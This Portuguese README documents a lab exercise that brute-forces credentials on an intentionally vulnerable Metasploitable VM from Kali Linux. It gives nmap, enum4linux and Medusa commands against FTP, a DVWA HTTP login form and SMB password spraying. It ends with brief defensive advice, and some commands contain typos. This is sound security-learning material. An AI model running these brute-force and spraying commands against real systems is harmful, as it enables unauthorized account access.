# Simulando-um-Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Neste repositório, será documento a simulação de um ataque Brute Force com senhas utilizando a ferramenta Medusa no SO Kali Linux

Após baixar a ferramenta Oracle Virtual Box e configurar as Máquinas virtuais do Kali Linux (na qual serão utilizadas as ferramentas que vêm previamente instaladas) e Metasploitable (Máquina virtual que contém vulnerabilidades propositalmente) na rede exclusiva de hospedeiro (host-only), devem ser iniciadas ambas as máquinas.

Primeiro, faça login no metasploitable utilizando as credenciais definidas por padrão (abaixo) e pegue o IP da máquina vulnerável com o comando: ip -a

Login: msfadmin
Senha: msfadmin

//FTP
Após isso, entre no kali, abra o terminal e tente enumerar as portas mais comuns relacionadas a vulnerabilidades com o seguinte comando: nmap -sV -p 21,22,80,445,139 192.168.56.102 (observar na pasta images).
Observando as portas abertas, pode-se verificar a porta FTP, a qual comprova-se a conexão utilizando o comando: ftp 192.168.56.102 (concede a opção para conexão);
Crie os arquivos de texto com nomes de usuário e senhas comuns para possibilitar o uso da ferramenta Medusa com os seguintes comando:
echo -e "user\msfadmin\nadmin\nroot" > users.txt (usuário comuns)
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt  (senhas comuns)

com isso, pode-se utilizar a ferramenta Medusa para tentativa de ataque Brute Force com o seguinte comando:
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6 
(-h = host; -U = lista de usuários; -P = Lista de senhas; -M = Modo/Protocolo das tentativas; -t = número de Treads usados)

Será retornado um "Log" indicando quais logins foram bem-sucedidos. Que podem ser testados com o comando: ftp 192.168.56.102 (digitando o login e senhas que obtiveram acesso "SUCCES").

//HTTP
Acessando a URL http://192.168.56.102/dvwa/login.php , é observado um formulário que, no menu Inspecionar (F12), mostra os parâmetros e métodos utilizados para requisições no site ao tentar o login. Mostrando os parâmetros:
{
	"username": "asd",
	"password": "asd",
	"Login": "Login"
}

Com isso, é possível organizar listas e parâmetros para ataque brute force no Medusa (pode utilizar da mesma lista de users e password anterior).
Utilizando o comando:
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \ -m PAGE:'/dvwa/login.php' \ -m FORM:'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login falied' -t 6
(-m -> especifica cada parâmetro a ser testado).

Deve ser retornado uma lista semelhante a gerada anteriormente, que, utilizando o user e senha, permite acesso ao site.

//SMB
SMB é um protocolo do próprio Windows e pode normalmente não permite o ataque Brute Force bloqueando o usuário após algumas tentativas de senha incorreta. Assim, faz-se necessário a utilização de outros modos, como testar uma senha em diversos usuários sileciozamente. 

Para criar a lista de usuário, iremos enumerar todos os serviços com a ferramenta enum4linux e o comando:
enum4linux -a 192.168.56.102 | tee enum4_output.txt 
(-a -> usa todas as técnicas de enumeração; tee -> salvar no arquivo "enum4_output.txt")

utilizando o comando abaixo, podemos ter o retorno desse comando (ler o arquivo)
less enum4_output.txt

analisando o arquivo, temos o retorno com nomes de usuários confirmados e, com isso, podemos criar uma lista específica de usuário e senhas comuns.
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt 

Assim, utilizando o comando abaixo, podemos configurar os parâmetros da ferramenta medusa para realizar o ataque:
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50  
(-T -> até 50 hosts em paralelo)

Observando que o Log retornará a lista de testes e, se der certo, o usuário e senha que se conectou no sistema, que pode ser testado fazendo a conexão com o SMB.
smbclient -L //192.168.56.102 -U msfadmin
(inserir a senha)

-------
Para evitar diversos ataques como esses, devemos utilizar limites de tentativas de login, verificação de 2 etapas, não cadastrar senhas fracas, dentre outras medidas.

